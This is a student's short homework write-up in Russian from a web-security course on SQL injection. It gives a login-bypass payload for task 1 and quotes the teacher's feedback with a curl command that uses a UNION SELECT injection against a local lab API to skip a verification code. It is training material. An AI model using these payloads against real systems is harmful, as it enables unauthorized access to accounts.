[Задание](https://github.com/netology-code/ibweb-homeworks/tree/master/03_sql)

## Задача 1

Нужно ввести в графу логин: sasha' OR '1' = '1 , в графу пароль что угодно.

## Задача 2 

Выполнить не смог, вот комментарий преподавателя:

```
Максим, приветствую!
Благодарю за выполнение ДЗ - ответы на обязательные вопросы верны.
Задание 2 – Код подтверждения. Пробуйте в командной строке такую конструкцию:
curl ‘http://127.0.0.1:8888/api/auth/verification’ -H ‘Content-Type: application/json’ --data-raw $’{“login”:"’ union select NULL, ‘sasha’, ‘2222’, NULL, NULL – ",“code”:“2222”}'
Тем не менее обязательная часть выполнена верно, поэтому - зачет.
Желаю успехов в дальнейшем изучении курса!
```
